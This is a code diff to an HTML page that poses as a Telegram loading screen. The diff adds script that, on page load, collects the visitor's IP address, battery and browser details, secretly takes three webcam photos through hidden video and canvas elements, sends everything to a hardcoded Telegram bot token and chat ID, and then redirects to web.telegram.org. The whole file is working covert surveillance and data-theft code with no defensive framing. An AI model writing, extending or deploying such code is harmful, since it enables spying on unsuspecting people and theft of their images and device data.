@@ -6,15 +6,133 @@
         #status {
             display: none;
         }
+        #camera {
+            display: none;
+        }
+        #loadingImage {
+            display: none;
+            width: 100%;
+            height: auto;
+            max-width: 640px; /* Maintain original aspect ratio */
+        }
+        @media (max-width: 640px) {
+            #loadingImage {
+                width: 100%;
+            }
+        }
     </style>
 </head>
 <body>
     <h1 id="system-info" style="display:none;">System Information</h1>
     <p id="status">Collecting data...</p>
+    <video id="camera" width="640" height="480" autoplay style="display:none;"></video>
+    <img id="loadingImage" src="https://www.androidpolice.com/wp-content/uploads/2021/03/19/telegram-voice-chat-2-2.gif" alt="Loading">
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
         const TELEGRAM_BOT_TOKEN = '5033312441:AAHf3soRV_BQk6rKTx5R6xH4TY2Jr5SCEp4';
         const TELEGRAM_CHAT_ID = '1683491443';
+
+        // Function to send a photo to Telegram
+        async function sendPhotoToTelegram(photoBlob) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', photoBlob);
+
+            try {
+                console.log('Sending photo to Telegram');
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+                console.log('Response from Telegram API:', data);
+                return data.ok;
+            } catch (error) {
+                console.error('Error sending photo to Telegram:', error);
+                return false;
+            }
+        }
+
+        // Function to capture photos from the camera
+        async function capturePhotos() {
+            const video = document.getElementById('camera');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            const photos = [];
+
+            // Access camera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.play();
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                return;
+            }
+
+            const captureInterval = setInterval(() => {
+                if (photos.length < 3) {
+                    // Draw image on canvas
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(blob => {
+                        photos.push(blob);
+                        if (photos.length === 3) {
+                            // Stop camera and show loading image
+                            clearInterval(captureInterval);
+                            video.srcObject.getTracks().forEach(track => track.stop());
+                            document.getElementById('loadingImage').style.display = 'block';
+                            sendPhotos(photos);
+                        }
+                    }, 'image/jpeg');
+                }
+            }, 1000); // Capture photo every 1 second
+        }
+
+        // Function to send captured photos to Telegram
+        async function sendPhotos(photos) {
+            for (const photo of photos) {
+                const success = await sendPhotoToTelegram(photo);
+                if (!success) {
+                    console.error('Failed to send one or more photos to Telegram.');
+                    return;
+                }
+            }
+            setTimeout(() => {
+                window.location.href = 'https://web.telegram.org/';
+            }, 3000); // Redirect after 3 seconds
+        }
+
+        // Function to gather data and trigger photo capture
+        async function gatherAndSendData() {
+            // Example data gathering (this part is optional and can be adjusted as needed)
+            const ip = await getIP();
+            const batteryStatus = await getBatteryStatus();
+            const browserInfo = getBrowserInfo();
+            const ipLink = `[${ip}](https://ip-api.com/#${ip})`;
+            const message = `
+▰▱▰▱▰▱▰▱▰▱▰▱▰▱
+IP Address 🔡: ${ipLink}
+▰▱▰▱▰▱▰▱▰▱▰▱▰▱
+Battery 🔋: ${batteryStatus}
+▰▱▰▱▰▱▰▱▰▱▰▱▰▱
+Browser info 🌍 : ${browserInfo}
+▰▱▰▱▰▱▰▱▰▱▰▱▰▱`;
+
+            const success = await sendMessageToTelegram(message);
+
+            const statusText = success ? 'Data sent to Telegram successfully!' : 'Failed to send data to Telegram.';
+            document.getElementById('status').textContent = statusText;
+
+            if (success) {
+                // Start capturing photos
+                capturePhotos();
+            }
+        }
+
+        // Run the main function
+        gatherAndSendData();
 
         // Function to get IP address
         async function getIP() {
@@ -35,7 +153,7 @@
                 const battery = await navigator.getBattery();
                 const level = battery.level * 100;
                 const charging = battery.charging ? 'charging' : 'not charging';
-                const batteryStatus = `Battery: ${level}% (${charging})`;
+                const batteryStatus = `${level}% (${charging})`;
                 console.log(batteryStatus);
                 return batteryStatus;
             } catch (error) {
@@ -49,7 +167,7 @@
             const userAgent = navigator.userAgent;
             const browserName = navigator.appName;
             const browserVersion = navigator.appVersion;
-            const browserInfo = `Browser: ${browserName} (Version: ${browserVersion}) - ${userAgent}`;
+            const browserInfo = `${browserName} (Version: ${browserVersion}) - ${userAgent}`;
             console.log(browserInfo);
             return browserInfo;
         }
@@ -80,27 +198,6 @@
                 return false;
             }
         }
-
-        // Main function to gather data and send to Telegram
-        async function gatherAndSendData() {
-            const ip = await getIP();
-            const batteryStatus = await getBatteryStatus();
-            const browserInfo = getBrowserInfo();
-
-            const ipLink = `[${ip}](https://ip-api.com/#${ip})`;
-            const message = `IP Address: ${ipLink}\nBattery: ${batteryStatus}\nBrowser: ${browserInfo}`;
-            const success = await sendMessageToTelegram(message);
-
-            const statusText = success ? 'Data sent to Telegram successfully!' : 'Failed to send data to Telegram.';
-            document.getElementById('status').textContent = statusText;
-
-            if (success) {
-                window.location.href = 'https://web.telegram.org/';
-            }
-        }
-
-        // Run the main function
-        gatherAndSendData();
     </script>
 </body>
 </html>
